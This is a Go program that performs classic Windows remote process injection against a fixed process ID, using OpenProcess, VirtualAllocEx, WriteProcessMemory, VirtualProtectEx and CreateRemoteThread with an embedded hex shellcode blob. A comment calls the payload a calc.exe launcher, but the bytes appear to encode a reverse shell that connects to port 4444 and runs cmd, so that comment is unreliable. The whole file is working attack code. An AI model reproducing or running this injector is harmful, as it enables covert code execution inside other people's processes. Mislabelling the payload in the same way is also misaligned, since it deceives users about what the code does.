package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	//target process ID o inject into
	pid := uint32(8316)
  
	//PROCESS_ALL_ACCESS gives full access rights to the process
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	//shell code to spawn calc.exe
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")

	fmt.Printf("[+] Getting a handle on process with pid: %d\n", pid)

	//Open the target process with full access right
	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)

	if err != nil {
		log.Fatalf("[-] Unable to get a handle on process with id: %d:%v", pid, err)

	}

	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	//load kernel32.dll to access windows API functions
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modkernel32.NewProc("VirtualAllocEx")

	//Allocate memory in the target process for our shellcode
	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle), //process handle
		uintptr(0),       //let system determine allocation memory
		uintptr(len(sc)), //shellcode length
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), //aLLOCation type
		uintptr(windows.PAGE_READWRITE))                 //iNITIAL memory protection

	if addr == 0 {
		log.Fatalf("[-]VirtualAlloc Failed: %v\n", lastErr)
	}
	fmt.Printf("[+]Allocated Memory Address: 0x%x\n", addr)

	//write the shellcode into the allocated memory in the target process
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)

	if err != nil {
		log.Fatalf("[-] Unable to write shellcode to allocated address")
	}
	fmt.Printf("[+]Wrote %d%d bytes to detination address\n", numberOfBytesWritten, len(sc))

	//change the memory to executable so we can run the target process
	var oldProtect uint32

	err = windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[-] VirtualProtect Failed: %v\n", err)
	}

	//create a remote thread in the target process that starts executing shell code
	procCreateRemoteThread := modkernel32.NewProc("CreateRemoteThread")
	var threadID uint32 = 0

	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),                   //Process Handle
		uintptr(0),                         //Thread security attributes
		uintptr(0),                         //Stack size(0=use default)
		addr,                               //Our shell code location
		uintptr(0),                         //thread parameter
		uintptr(0),                         //0= run immediately
		uintptr(unsafe.Pointer(&threadID)), //Thread ID output
	)

	if tHandle == 0 {
		log.Fatalf("[-]Unable to create remote thread: %v \n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread: 0x%x \n[+] Thread ID: %d\n", tHandle, threadID)

}
